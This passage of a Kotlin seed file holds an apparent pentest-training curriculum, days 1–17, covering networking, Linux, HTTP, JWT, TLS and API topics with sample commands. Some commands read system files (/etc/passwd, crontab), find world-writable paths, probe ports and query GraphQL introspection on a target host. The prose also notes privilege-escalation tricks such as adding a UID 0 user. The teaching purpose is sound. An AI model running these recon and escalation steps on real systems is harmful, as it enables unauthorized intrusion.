package com.example.data.seed

import com.example.data.model.DayEntity
import com.example.data.model.QuizQuestionEntity

object CurriculumPhase1 {
    fun getDays(): List<DayEntity> = listOf(
        DayEntity(
            id = 1,
            phase = 1,
            dayNumber = 1,
            title = "OSI Model & Modern TCP/IP Architecture",
            subtitle = "Master the 7 layers and how data packets traverse the internet.",
            concept = """
                The OSI (Open Systems Interconnection) model is a conceptual framework that standardizes the functions of a telecommunication or computing system into seven abstraction layers:
                1. Physical Layer (Cables, RF, Hubs, bitstreams)
                2. Data Link Layer (Frames, MAC addresses, Ethernet, Switches)
                3. Network Layer (Packets, IP addressing, Routing, ICMP)
                4. Transport Layer (Segments/Datagrams, TCP 3-way handshake, UDP, Ports)
                5. Session Layer (Session establishment, NetBIOS, RPC)
                6. Presentation Layer (Data formatting, Encryption/Decryption, Compression)
                7. Application Layer (HTTP/S, SSH, FTP, DNS, SMTP)

                In penetration testing, vulnerability discovery corresponds directly to these layers. Understanding packet encapsulation (L2 Frame -> L3 IP Packet -> L4 TCP Segment -> L7 Payload) allows you to diagnose firewalls, manipulate headers, and perform low-level network poisoning.
            """.trimIndent(),
            keyTakeaways = "• Encapsulation adds headers at each descending layer.\n• TCP guarantees delivery via 3-way handshake (SYN, SYN-ACK, ACK); UDP is connectionless.\n• MAC addresses operate at L2; IP addresses operate at L3.",
            commandsCode = "# Inspect local network interfaces and IP assignment\nip -brief address show\n\n# Trace packet route and hops across layers\ntraceroute -n 8.8.8.8",
            videoTitle = "The OSI Model Explained in 10 Minutes",
            videoUrl = "https://www.youtube.com/watch?v=LANW3m7UgWs",
            videoChannel = "NetworkChuck",
            videoDuration = "12m",
            readTitle = "RFC 793 - Transmission Control Protocol",
            readUrl = "https://www.rfc-editor.org/rfc/rfc793",
            readSource = "IETF",
            labTitle = "Introductory Networking - TryHackMe",
            labUrl = "https://tryhackme.com/room/introtonetworking",
            labPlatform = "TryHackMe",
            labDescription = "Complete the 7-layer encapsulation and packet analysis module.",
            xpReward = 50
        ),
        DayEntity(
            id = 2,
            phase = 1,
            dayNumber = 2,
            title = "IP Addressing, Subnetting & CIDR Calculation",
            subtitle = "Understand IPv4 classful & classless masks, broadcast domains, and private subnets.",
            concept = """
                IP addresses are 32-bit logical identifiers divided into Network and Host portions by a Subnet Mask.
                Private IP Ranges (RFC 1918):
                - Class A: 10.0.0.0/8 (10.0.0.0 - 10.255.255.255)
                - Class B: 172.16.0.0/12 (172.16.0.0 - 172.31.255.255)
                - Class C: 192.168.0.0/16 (192.168.0.0 - 192.168.255.255)

                CIDR (Classless Inter-Domain Routing) notation like /24 indicates 24 bits reserved for network (mask 255.255.255.0), leaving 8 bits for 256 addresses (254 usable hosts, .0 for network ID, .255 for broadcast).
                In penetration tests, accurate subnet calculation prevents accidentally attacking out-of-scope enterprise subnets.
            """.trimIndent(),
            keyTakeaways = "• Network address has all host bits set to 0; broadcast has all host bits set to 1.\n• RFC 1918 specifies non-routable private address spaces.\n• Subnet mask bit math: Number of usable hosts = 2^(32 - prefix) - 2.",
            commandsCode = "# Calculate subnet boundaries from CLI\nipcalc 192.168.1.100/26\n\n# View local routing table and default gateway\nip route show",
            videoTitle = "Subnetting Mastery in 15 Minutes",
            videoUrl = "https://www.youtube.com/watch?v=5WfiTHiU4x8",
            videoChannel = "Professor Messer",
            videoDuration = "15m",
            readTitle = "RFC 1918 Private Address Allocation",
            readUrl = "https://datatracker.ietf.org/doc/html/rfc1918",
            readSource = "IETF",
            labTitle = "Subnetting Fundamentals Lab",
            labUrl = "https://tryhackme.com/room/introtonetworking",
            labPlatform = "TryHackMe",
            labDescription = "Calculate broadcast and network addresses for complex CIDR ranges.",
            xpReward = 50
        ),
        DayEntity(
            id = 3,
            phase = 1,
            dayNumber = 3,
            title = "TCP vs UDP & Port Fundamentals",
            subtitle = "Deep dive into the 3-Way Handshake, TCP Flags (SYN, ACK, FIN, RST), and Well-Known Ports.",
            concept = """
                The Transport Layer relies on two fundamental protocols:
                - TCP (Transmission Control Protocol): Connection-oriented, stateful, ensures in-order delivery via sequence numbers and ACKs.
                  3-Way Handshake: Client sends SYN -> Server returns SYN-ACK -> Client responds with ACK (Connection Established).
                  Connection Teardown: FIN -> ACK -> FIN -> ACK (or immediate RST).
                - UDP (User Datagram Protocol): Connectionless, minimal overhead, no delivery verification (used in DNS, DHCP, VoIP, TFTP, Video streaming).

                Standard Port Ranges:
                - Well-Known Ports: 0 - 1023 (HTTP 80, HTTPS 443, SSH 22, Telnet 23, FTP 21, DNS 53, SMB 445, RDP 3389)
                - Registered Ports: 1024 - 49151
                - Dynamic / Ephemeral Ports: 49152 - 65535
            """.trimIndent(),
            keyTakeaways = "• RST flag immediately resets an illegitimate or closed connection.\n• Port scanning techniques (SYN scan) rely on intercepting or aborting the 3-way handshake.\n• Raw sockets enable crafted packets with arbitrary TCP flag combinations.",
            commandsCode = "# Check active TCP/UDP listening ports and active sockets\nss -tuln\n\n# Test a TCP socket connection manually using netcat\nnc -vzw 3 192.168.1.1 22",
            videoTitle = "TCP vs UDP Comparison & 3-Way Handshake",
            videoUrl = "https://www.youtube.com/watch?v=uwoD5YsGACg",
            videoChannel = "NetworkChuck",
            videoDuration = "14m",
            readTitle = "TCP Protocol Analysis & Flag Matrix",
            readUrl = "https://www.wireshark.org/docs/dfref/t/tcp.html",
            readSource = "Wireshark Docs",
            labTitle = "Protocols and Ports Practice",
            labUrl = "https://tryhackme.com/room/introtonetworking",
            labPlatform = "TryHackMe",
            labDescription = "Inspect SYN/ACK packets using Wireshark and socket tools.",
            xpReward = 50
        ),
        DayEntity(
            id = 4,
            phase = 1,
            dayNumber = 4,
            title = "DNS, DHCP & Address Resolution Protocol (ARP)",
            subtitle = "Understand how hostnames resolve, IP addresses are leased, and MAC tables operate.",
            concept = """
                - ARP (Address Resolution Protocol): Resolves Layer 3 IP addresses to Layer 2 physical MAC addresses on a local broadcast domain. ARP has zero built-in authentication, making ARP Poisoning / Spoofing a classic Man-in-the-Middle (MitM) attack.
                - DNS (Domain Name System): Hierarchical naming system translating human domains to IPs.
                  DNS Record Types: A (IPv4), AAAA (IPv6), MX (Mail Exchange), NS (Nameserver), TXT (SPF/Domain keys), CNAME (Canonical name), PTR (Reverse lookup).
                - DHCP (Dynamic Host Configuration Protocol): Uses DORA process (Discover, Offer, Request, Acknowledge) over UDP ports 67/68 to assign IP, gateway, and DNS servers dynamically.
            """.trimIndent(),
            keyTakeaways = "• ARP tables map IPs to MAC addresses in kernel memory cache.\n• DNS queries are typically UDP 53; Zone transfers (AXFR) use TCP 53.\n• Unauthenticated ARP allows attackers to become the default gateway.",
            commandsCode = "# Query DNS records for a target domain\ndig target.com ANY +noall +answer\n\n# View and inspect ARP cache table\nip neigh show\narp -a",
            videoTitle = "How DNS Really Works Step by Step",
            videoUrl = "https://www.youtube.com/watch?v=27r4Bzuj5OI",
            videoChannel = "PowerCert Animated Videos",
            videoDuration = "11m",
            readTitle = "DNS Protocol & Zone Transfer Basics",
            readUrl = "https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns",
            readSource = "HackTricks",
            labTitle = "DNS in Detail Room",
            labUrl = "https://tryhackme.com/room/dnsindetail",
            labPlatform = "TryHackMe",
            labDescription = "Perform DNS lookups, reverse lookups, and analyze TXT verification records.",
            xpReward = 50
        ),
        DayEntity(
            id = 5,
            phase = 1,
            dayNumber = 5,
            title = "Wireshark Packet Analysis & PCAP Inspection",
            subtitle = "Capture live traffic, write display filters, follow TCP streams, and extract cleartext credentials.",
            concept = """
                Wireshark is the industry-standard packet analyzer. It provides deep inspection of hundreds of protocols.
                Key Display Filter Syntax:
                - `ip.addr == 192.168.1.50` (Filter by specific IP)
                - `tcp.port == 80 || tcp.port == 443` (HTTP/HTTPS traffic)
                - `http.request.method == "POST"` (Inspect login payloads)
                - `tcp.flags.syn == 1 && tcp.flags.ack == 0` (SYN packets only)
                - `frame contains "password"` (String search across payloads)

                In packet analysis:
                Right Click -> 'Follow' -> 'TCP Stream' reconstructs entire bidirectional conversations into clean ASCII/Hex views.
            """.trimIndent(),
            keyTakeaways = "• Display filters filter after capture; Capture filters (BPF) filter packets before storing in memory.\n• TCP stream reassembly allows instant reading of unencrypted protocols (HTTP, Telnet, FTP, LDAP).\n• Export Objects feature extracts transferred files directly from PCAP files.",
            commandsCode = "# Capture 100 packets on eth0 with tcpdump to pcap\nsudo tcpdump -i eth0 -c 100 -w capture.pcap\n\n# Read pcap in terminal using tshark\ntshark -r capture.pcap -Y 'http.request'",
            videoTitle = "Wireshark 101 for Cyber Security Specialists",
            videoUrl = "https://www.youtube.com/watch?v=lb1Dw0elw0Q",
            videoChannel = "David Bombal",
            videoDuration = "22m",
            readTitle = "Wireshark User's Guide & Display Filter Reference",
            readUrl = "https://www.wireshark.org/docs/wsug_html_chunked/",
            readSource = "Wireshark Foundation",
            labTitle = "Wireshark 101 & Packet Analysis",
            labUrl = "https://tryhackme.com/room/wireshark101",
            labPlatform = "TryHackMe",
            labDescription = "Analyze malware PCAPs and extract captured FTP credentials.",
            xpReward = 50
        ),
        DayEntity(
            id = 6,
            phase = 1,
            dayNumber = 6,
            title = "Linux CLI Essentials: File Navigation & Permissions",
            subtitle = "Master the Linux Filesystem Hierarchy (FHS), inode structure, and numeric chmod/chown masks.",
            concept = """
                Linux is the primary operating system for offensive security.
                Key Filesystem Hierarchy:
                - `/bin`, `/usr/bin`: Core executable binaries.
                - `/etc`: System-wide configuration files (passwd, shadow, sudoers).
                - `/var/log`: System and application logs (auth.log, syslog).
                - `/tmp`, `/dev/shm`: World-writable temporary folders (crucial for dropping initial exploit payloads).
                - `/proc`: Virtual filesystem representing kernel parameters and active processes.

                Permission Bits:
                Read (r=4), Write (w=2), Execute (x=1).
                Triplets: User (Owner), Group, Others. E.g. `chmod 755 script.sh` (rwxr-xr-x).
                Special Permissions: SUID (4000), SGID (2000), Sticky Bit (1000).
            """.trimIndent(),
            keyTakeaways = "• SUID bit causes binary to execute with owner privileges (often root).\n• World-writable folders like /tmp and /dev/shm are standard payload staging directories.\n• Hidden files start with a dot (.) and are shown with `ls -la`.",
            commandsCode = "# Find world-writable files on the system\nfind / -type f -perm -0002 2>/dev/null\n\n# Inspect file details, ownership, and octal permissions\nstat -c '%a %n %U:%G' /etc/passwd",
            videoTitle = "Linux for Hackers: Complete Command Line Crash Course",
            videoUrl = "https://www.youtube.com/watch?v=lZAoFs75_cs",
            videoChannel = "John Hammond",
            videoDuration = "28m",
            readTitle = "Linux Filesystem Hierarchy Standard Reference",
            readUrl = "https://refspecs.linuxfoundation.org/FHS_3.0/fhs-3.0.html",
            readSource = "Linux Foundation",
            labTitle = "OverTheWire: Bandit Levels 0-5",
            labUrl = "https://overthewire.org/wargames/bandit/",
            labPlatform = "OverTheWire",
            labDescription = "Connect via SSH and solve file permission and hidden file challenges.",
            xpReward = 50
        ),
        DayEntity(
            id = 7,
            phase = 1,
            dayNumber = 7,
            title = "Text Processing & Stream Manipulation (grep, sed, awk)",
            subtitle = "Slice, filter, and extract high-value intelligence from large logfiles and recon outputs.",
            concept = """
                Offensive operations generate vast data (Nmap XML, Gobuster lists, access logs). Stream manipulation tools are vital:
                - `grep`: Searches regular expressions. Flags: `-i` (case-insensitive), `-v` (invert), `-r` (recursive), `-E` (extended regex), `-o` (only matching).
                - `awk`: Column-oriented pattern scanning and processing language. E.g., `awk '{print $1, $3}'`.
                - `sed`: Stream editor for filtering and transforming text via regex substitution. E.g., `sed 's/foo/bar/g'`.
                - `cut`, `sort`, `uniq -c`, `tr`: Quick pipelines for summarizing IP hits, wordlists, and credential dumps.
            """.trimIndent(),
            keyTakeaways = "• Chaining tools via UNIX pipes (|) is standard recon methodology.\n• `sort -u` removes duplicates from target IP lists.\n• `grep -E -o '([0-9]{1,3}\\.){3}[0-9]{1,3}'` extracts all IPv4 addresses from unformatted logs.",
            commandsCode = "# Extract unique IP addresses from web server access log\ncat access.log | awk '{print $1}' | sort | uniq -c | sort -nr\n\n# Substitute target host in config template\nsed -i 's/10.10.10.1/192.168.1.100/g' exploit.conf",
            videoTitle = "Grep, Sed, & Awk for Ethical Hackers & Sysadmins",
            videoUrl = "https://www.youtube.com/watch?v=ezXfZj_g9y8",
            videoChannel = "NetworkChuck",
            videoDuration = "18m",
            readTitle = "The Linux Command Line Text Processing Handbook",
            readUrl = "https://linuxcommand.org/lc3_adv_termlib.php",
            readSource = "LinuxCommand.org",
            labTitle = "OverTheWire: Bandit Levels 6-12",
            labUrl = "https://overthewire.org/wargames/bandit/bandit6.html",
            labPlatform = "OverTheWire",
            labDescription = "Use text filtering, base64 decoding, and gzip decompression to uncover flags.",
            xpReward = 50
        ),
        DayEntity(
            id = 8,
            phase = 1,
            dayNumber = 8,
            title = "Linux Process Management, Systemd & Cron Jobs",
            subtitle = "Monitor background daemons, analyze `/proc`, and spot scheduled privilege escalation vectors.",
            concept = """
                Linux treats everything as a file, including processes via the `/proc/[PID]` virtual directory:
                - `ps aux` / `ps -ef`: Lists all executing processes with PID, user, CPU%, and command line arguments.
                - `systemctl`: Manages systemd services (`status`, `start`, `enable`). Service unit files located in `/etc/systemd/system/`.
                - `cron`: Task scheduler executing recurring scripts. Defined in `/etc/crontab`, `/etc/cron.*`, and user crontabs (`crontab -l`).
                Security relevance: If a cron job runs as root with writable script permissions or missing absolute paths, an unprivileged user can modify the script to obtain root shell!
            """.trimIndent(),
            keyTakeaways = "• `/proc/version` reveals exact Linux kernel version.\n• `/proc/[PID]/cmdline` shows arguments supplied when process started.\n• Misconfigured cron jobs running as root are a top privilege escalation vector.",
            commandsCode = "# Inspect running processes and look for root scripts\nps aux | grep root\n\n# Check system cron tables and timers\ncat /etc/crontab\nsystemctl list-timers",
            videoTitle = "Linux Processes & Services Deep Dive",
            videoUrl = "https://www.youtube.com/watch?v=Kz6mQ8bX1i0",
            videoChannel = "John Hammond",
            videoDuration = "16m",
            readTitle = "Systemd Security Hardening & Privilege Escalation",
            readUrl = "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs",
            readSource = "HackTricks",
            labTitle = "Linux Privilege Escalation - Cron & Processes",
            labUrl = "https://tryhackme.com/room/linprivesc",
            labPlatform = "TryHackMe",
            labDescription = "Exploit a misconfigured root cron job to capture a root flag.",
            xpReward = 50
        ),
        DayEntity(
            id = 9,
            phase = 1,
            dayNumber = 9,
            title = "User Management, Groups & Linux Authentication Architecture",
            subtitle = "Examine `/etc/passwd`, `/etc/shadow`, PAM (Pluggable Auth Modules), and sudo rules.",
            concept = """
                User authentication in Linux centers on two fundamental files:
                - `/etc/passwd`: World-readable file containing username, UID, GID, comment/name, home directory, and default login shell. (UID 0 represents root).
                - `/etc/shadow`: Restricted file (root only) storing password hashes, salt strings, expiration dates, and algorithm identifiers.
                  Hash prefix identifiers: ${'$'}1${'$'} (MD5), ${'$'}5${'$'} (SHA-256), ${'$'}6${'$'} (SHA-512), ${'$'}y${'$'} (yescrypt).
                - `/etc/sudoers`: Specifies which users or groups can execute commands as other users (often root) with `sudo`.
            """.trimIndent(),
            keyTakeaways = "• Sudo permissions can be checked on any compromised account with `sudo -l`.\n• If `/etc/passwd` is world-writable, you can generate a crypt hash and append a new UID 0 user.\n• Modern Linux systems hash passwords using SHA-512 (${'$'}6${'$'}) or Yescrypt (${'$'}y${'$'}).",
            commandsCode = "# Check current user privileges and available sudo commands\nsudo -l\n\n# Inspect /etc/passwd user entries\ncat /etc/passwd | grep -E '/bin/bash|/bin/sh'",
            videoTitle = "How Linux Passwords and Shadow Files Work",
            videoUrl = "https://www.youtube.com/watch?v=0k5aN2T37g8",
            videoChannel = "NetworkChuck",
            videoDuration = "15m",
            readTitle = "Linux Security: /etc/passwd and /etc/shadow Deep Dive",
            readUrl = "https://gtfobins.github.io/",
            readSource = "GTFOBins",
            labTitle = "OverTheWire: Bandit Levels 13-18",
            labUrl = "https://overthewire.org/wargames/bandit/bandit13.html",
            labPlatform = "OverTheWire",
            labDescription = "Use SSH keys, shell escape tricks, and user switches to advance.",
            xpReward = 50
        ),
        DayEntity(
            id = 10,
            phase = 1,
            dayNumber = 10,
            title = "SSH Cryptography, Key Pairs & Remote Access Hardening",
            subtitle = "Understand asymmetric key exchange, authorized_keys, SSH agent forwarding, and tunneling.",
            concept = """
                SSH (Secure Shell, port 22) uses asymmetric public-key cryptography to secure terminal communications:
                - Public Key (`id_rsa.pub` or `id_ed25519.pub`): Placed on the target server in `~/.ssh/authorized_keys`.
                - Private Key (`id_rsa` or `id_ed25519`): Stored strictly on the client machine with permission 600 (`chmod 600 id_rsa`).
                - Diffie-Hellman Key Exchange: Negotiates a temporary symmetric session key (AES/ChaCha20) over an insecure medium.
                - Known Hosts (`~/.ssh/known_hosts`): Stores host public key fingerprints to prevent Man-in-the-Middle impersonation.
            """.trimIndent(),
            keyTakeaways = "• Private SSH keys must have strict file permissions (chmod 600) or SSH will reject them.\n• ed25519 keys are preferred over 2048/4096-bit RSA due to speed and modern elliptic curve security.\n• Compromising an unencrypted private key grants instant passwordless shell access.",
            commandsCode = "# Generate a modern ed25519 SSH keypair\nssh-keygen -t ed25519 -C 'operator@hackpath.io'\n\n# Connect using a specific private key file\nssh -i ./target_id_rsa user@10.10.10.50",
            videoTitle = "SSH Keys Explained Simply (Public & Private Keys)",
            videoUrl = "https://www.youtube.com/watch?v=dPAw4opzN9g",
            videoChannel = "NetworkChuck",
            videoDuration = "17m",
            readTitle = "OpenSSH Security Architecture & Configuration Best Practices",
            readUrl = "https://infosec.mozilla.org/guidelines/openssh",
            readSource = "Mozilla Infosec",
            labTitle = "SSH Hardening and Key Exploitation Lab",
            labUrl = "https://tryhackme.com/room/introtonetworking",
            labPlatform = "TryHackMe",
            labDescription = "Inspect leaked private keys, fix permissions, and log in to protected servers.",
            xpReward = 50
        ),
        DayEntity(
            id = 11,
            phase = 1,
            dayNumber = 11,
            title = "Bash Scripting for Pentesters & Automation",
            subtitle = "Write robust Bash automation scripts: loops, conditionals, positional arguments, and subshells.",
            concept = """
                Bash scripting is the glue that unites penetration testing tools.
                Essential Building Blocks:
                - Shebang line: `#!/usr/bin/env bash` (specifies execution interpreter).
                - Variables & Positional Arguments: ${'$'}1, ${'$'}2, ${'$'}# (arg count), ${'$'}? (exit code of last command).
                - For Loops: for ip in ${'$'}(cat ips.txt); do nmap -sC -sV ${'$'}ip; done
                - Conditionals: if [ -f "${'$'}1" ]; then ... fi
                - Subshells & Process Substitution: diff <(sort list1.txt) <(sort list2.txt)
                - Output redirection: > (overwrite), >> (append), 2>/dev/null (silence standard error).
            """.trimIndent(),
            keyTakeaways = "• `set -euo pipefail` at the top of scripts prevents silent failures in production scripts.\n• Exit code `0` indicates success; any non-zero exit code indicates an error condition.\n• One-liner bash loops allow rapid ping sweeps across entire /24 subnets.",
            commandsCode = "# Quick ICMP ping sweep across a /24 subnet using Bash\nfor i in {1..254}; do ping -c 1 -W 1 192.168.1.\$i | grep 'from' & done",
            videoTitle = "Bash Scripting for Cyber Security & Pentesters",
            videoUrl = "https://www.youtube.com/watch?v=e7BufAVwDiM",
            videoChannel = "TCM Security",
            videoDuration = "35m",
            readTitle = "Bash Hackers Wiki: Advanced Scripting Guide",
            readUrl = "https://wiki.bash-hackers.org/",
            readSource = "Bash Hackers",
            labTitle = "OverTheWire: Bandit Levels 19-24",
            labUrl = "https://overthewire.org/wargames/bandit/bandit19.html",
            labPlatform = "OverTheWire",
            labDescription = "Write a loop to brute-force a pin code through a local port listener.",
            xpReward = 50
        ),
        DayEntity(
            id = 12,
            phase = 1,
            dayNumber = 12,
            title = "HTTP/HTTPS Anatomy: Methods, Headers & Status Codes",
            subtitle = "Dissect request/response transactions, cookie flags (HttpOnly, Secure, SameSite), and verbs.",
            concept = """
                The Hypertext Transfer Protocol (HTTP) is a stateless application-layer protocol powering the web.
                Request Anatomy:
                - Request Line: `GET /dashboard HTTP/1.1`
                - Headers: `Host: app.io`, `User-Agent: ...`, `Authorization: Bearer <JWT>`, `Cookie: session=xyz`
                - Body: Form data, JSON, XML, or binary payloads.

                Standard HTTP Verbs: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE.
                HTTP Status Code Ranges:
                - 1xx: Informational (101 Switching Protocols - WebSockets)
                - 2xx: Success (200 OK, 201 Created, 204 No Content)
                - 3xx: Redirection (301 Moved Permanently, 302 Found, 304 Not Modified)
                - 4xx: Client Error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
                - 5xx: Server Error (500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable)
            """.trimIndent(),
            keyTakeaways = "• `HttpOnly` cookie flag prevents JavaScript document.cookie access (mitigates XSS cookie theft).\n• `Secure` flag ensures cookies are only transmitted over TLS encrypted channels.\n• 401 indicates lack of valid credentials; 403 indicates authenticated user lacks permissions.",
            commandsCode = "# Send raw HTTP request and inspect headers with curl\ncurl -ik -X OPTIONS https://target.com/api\n\n# Dump full request & response headers\ncurl -v https://target.com/login",
            videoTitle = "HTTP and HTTPS Crash Course for Web Hackers",
            videoUrl = "https://www.youtube.com/watch?v=iYM2zFP3Zn0",
            videoChannel = "NetworkChuck",
            videoDuration = "19m",
            readTitle = "MDN Web Docs: HTTP Protocol Reference & Headers",
            readUrl = "https://developer.mozilla.org/en-US/docs/Web/HTTP",
            readSource = "Mozilla Developer Network",
            labTitle = "Web Fundamentals - TryHackMe",
            labUrl = "https://tryhackme.com/room/webfundamentals",
            labPlatform = "TryHackMe",
            labDescription = "Inspect HTTP requests, manipulate User-Agents, and bypass simple header checks.",
            xpReward = 50
        ),
        DayEntity(
            id = 13,
            phase = 1,
            dayNumber = 13,
            title = "Web Cookies, Sessions, JWTs & State Management",
            subtitle = "Analyze session fixation, cookie tampering, JWT structure (Header.Payload.Signature), and storage.",
            concept = """
                Because HTTP is stateless, web apps use tokens to maintain user identity:
                - Traditional Sessions: Server generates a cryptographically random session ID, stores session state in Redis/SQL, and issues ID as a cookie (`Set-Cookie: sessionid=abc`).
                - JSON Web Tokens (JWT): Self-contained, stateless tokens with 3 parts separated by dots:
                  1. Header: Algorithm & Token type (`{"alg": "HS256", "typ": "JWT"}`) base64url encoded.
                  2. Payload: Claims (`{"sub": "123", "role": "admin", "exp": 1699999999}`) base64url encoded.
                  3. Signature: HMACSHA256(header + "." + payload, secret).
                Common JWT Vulnerabilities: Algorithm Confusion (`"alg": "none"`), Weak HMAC secrets cracked with Hashcat, and missing signature verification.
            """.trimIndent(),
            keyTakeaways = "• JWT payload is ONLY encoded in base64, NEVER encrypted by default.\n• Tampering with payload without modifying signature will fail on properly configured servers.\n• Session IDs must have high entropy (minimum 128 bits) to resist brute-force prediction.",
            commandsCode = "# Base64 decode a JWT payload from CLI\necho 'eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0=' | base64 -d",
            videoTitle = "JSON Web Tokens (JWT) Explained for Hackers",
            videoUrl = "https://www.youtube.com/watch?v=7Q17ubqL20o",
            videoChannel = "Web Dev Simplified",
            videoDuration = "14m",
            readTitle = "PortSwigger Web Security: JWT Attacks & Vulnerabilities",
            readUrl = "https://portswigger.net/web-security/jwt",
            readSource = "PortSwigger",
            labTitle = "PortSwigger Academy: JWT Authentication Bypass",
            labUrl = "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature",
            labPlatform = "PortSwigger",
            labDescription = "Bypass authentication by modifying JWT role payload and stripping signature verification.",
            xpReward = 50
        ),
        DayEntity(
            id = 14,
            phase = 1,
            dayNumber = 14,
            title = "TLS/SSL Handshake, Certificates & Cryptographic Attacks",
            subtitle = "Examine TLS 1.2 vs 1.3, PKI trust chains, CA root stores, and Certificate Pinning.",
            concept = """
                Transport Layer Security (TLS) provides confidentiality, integrity, and authentication:
                1. Client Hello: Supported cipher suites, TLS version, random client nonce.
                2. Server Hello: Chosen cipher suite, server random nonce, X.509 digital certificate.
                3. Certificate Validation: Client verifies server certificate against trusted Root Certificate Authorities (CAs) in the OS/browser trust store.
                4. Key Exchange: ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) creates forward secrecy.
                5. Finished: Communication switches to encrypted symmetric cipher (e.g. AES-GCM-256).

                Pentesters must inspect certificates for subject alternative names (SANs) containing hidden subdomains, weak RSA key lengths (<2048 bits), and deprecated SSLv3/TLS 1.0 protocols.
            """.trimIndent(),
            keyTakeaways = "• Perfect Forward Secrecy (PFS) ensures past sessions cannot be decrypted even if private key is compromised later.\n• Subject Alternative Name (SAN) fields in SSL certs frequently disclose internal staging domains.\n• Testssl.sh automates thorough TLS configuration testing.",
            commandsCode = "# Inspect remote SSL certificate and SANs without browser\nopenssl s_client -connect target.com:443 -showcerts\n\n# Check supported TLS ciphers with nmap script\nnmap --script ssl-enum-ciphers -p 443 target.com",
            videoTitle = "TLS 1.3 Handshake Explained Step by Step",
            videoUrl = "https://www.youtube.com/watch?v=1uDEtfa0x2k",
            videoChannel = "Computerphile",
            videoDuration = "15m",
            readTitle = "OWASP Transport Layer Protection Cheat Sheet",
            readUrl = "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html",
            readSource = "OWASP",
            labTitle = "SSL/TLS Analysis Lab",
            labUrl = "https://tryhackme.com/room/introtonetworking",
            labPlatform = "TryHackMe",
            labDescription = "Analyze TLS handshake captures and identify insecure cipher configurations.",
            xpReward = 50
        ),
        DayEntity(
            id = 15,
            phase = 1,
            dayNumber = 15,
            title = "REST, GraphQL & WebSockets API Architecture",
            subtitle = "Understand stateless API endpoints, JSON serialization, query depth, and full-duplex socket frames.",
            concept = """
                Modern web applications rely heavily on APIs rather than monolithic page renders:
                - REST (Representational State Transfer): Uses HTTP verbs on resource URIs (`GET /api/v1/users/42`). Predictable patterns facilitate endpoint fuzzing.
                - GraphQL: Single endpoint (`POST /graphql`) accepting queries specifying exact data requirements. Vulnerable to Introspection query exposure (leaks full schema) and recursive batching DoS.
                - WebSockets (`ws://`, `wss://`): Persistent, bidirectional, full-duplex TCP communication initiated via HTTP Upgrade header (`Upgrade: websocket`). Often bypasses traditional Web Application Firewall (WAF) inspections.
            """.trimIndent(),
            keyTakeaways = "• Enabling GraphQL introspection (`__schema { types { name } }`) leaks the entire database model.\n• REST APIs often suffer from IDOR (Insecure Direct Object Reference) in path parameters.\n• WebSocket messages must validate authorization on every single frame, not just the handshake.",
            commandsCode = "# Query GraphQL introspection schema\ncurl -X POST https://api.target.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
            videoTitle = "API Security Fundamentals for Hackers",
            videoUrl = "https://www.youtube.com/watch?v=7Xm6T2G8H_0",
            videoChannel = "InsiderPhD",
            videoDuration = "21m",
            readTitle = "OWASP API Security Top 10 Standard",
            readUrl = "https://owasp.org/www-project-api-security/",
            readSource = "OWASP",
            labTitle = "PortSwigger Academy: GraphQL Introspection",
            labUrl = "https://portswigger.net/web-security/graphql",
            labPlatform = "PortSwigger",
            labDescription = "Extract hidden admin mutations from an exposed GraphQL schema.",
            xpReward = 50
        ),
        DayEntity(
            id = 16,
            phase = 1,
            dayNumber = 16,
            title = "Virtualization & Pentest Lab Setup (Kali & VM Architecture)",
            subtitle = "Configure isolated host-only, NAT, and bridged networks with Kali Linux and vulnerable targets.",
            concept = """
                Safe and legal ethical hacking requires dedicated virtualization environments:
                - Hypervisors: Type 1 (Bare-metal: ESXi, Proxmox) vs Type 2 (Hosted: VirtualBox, VMware Workstation).
                - Virtual Networking Modes:
                  1. NAT (Network Address Translation): VM shares host IP; isolated from external incoming connections.
                  2. Bridged: VM gets an independent IP on host physical network; accessible by local network devices.
                  3. Host-Only: Isolated network between host and VMs only (safest for vulnerable target machines like Metasploitable).
                - Snapshots: Captures RAM and disk state at a specific timestamp; allows instant rollback after malware detonation or failed exploits.
            """.trimIndent(),
            keyTakeaways = "• Never bridge deliberately vulnerable practice machines to public Wi-Fi networks.\n• Take a clean snapshot of your Kali VM immediately after fresh installation and updates.\n• Use separate dedicated network adapters for management traffic vs target traffic.",
            commandsCode = "# Update Kali Linux package repositories and install core toolkit\nsudo apt update && sudo apt install -y seclists curl git gobuster nmap",
            videoTitle = "Build Your Ultimate Ethical Hacking Lab at Home",
            videoUrl = "https://www.youtube.com/watch?v=WnNCNU4W6L8",
            videoChannel = "NetworkChuck",
            videoDuration = "25m",
            readTitle = "Kali Linux Official Documentation & Tools Listing",
            readUrl = "https://www.kali.org/docs/",
            readSource = "OffSec",
            labTitle = "Kali Linux 101 - TryHackMe",
            labUrl = "https://tryhackme.com/room/kalilinux",
            labPlatform = "TryHackMe",
            labDescription = "Familiarize yourself with Kali terminal utilities and directory shortcuts.",
            xpReward = 50
        ),
        DayEntity(
            id = 17,
            phase = 1,
            dayNumber = 17,
            title = "CTF Methodology, Cryptographic Basics & Encoding",
            subtitle = "Distinguish Hashing, Encryption, and Encoding (Base64, Hex, URL, XOR, ROT13, Caesar).",
            concept = """
                In offensive security and CTF competitions, recognizing data representation is fundamental:
                - Encoding (Reversible without key):
                  * Base64: Uses `A-Z`, `a-z`, `0-9`, `+`, `/`, with `=` padding. E.g., `SGFja1BhdGg=`
                  * Hex (Base16): Uses `0-9`, `a-f`. E.g., `4861636b`
                  * URL Encoding: Percent-encoded characters. E.g., `%20` (space), `%27` (single quote).
                - Hashing (One-way mathematical digest): MD5 (128-bit/32 hex), SHA-1 (160-bit/40 hex), SHA-256 (256-bit/64 hex). Deterministic, fixed length.
                - Encryption (Reversible with key): Symmetric (AES, DES) vs Asymmetric (RSA, ECC).
                - CyberChef (gchq.github.io/CyberChef): The essential web tool ("The Cyber Swiss Army Knife") for chaining decoders.
            """.trimIndent(),
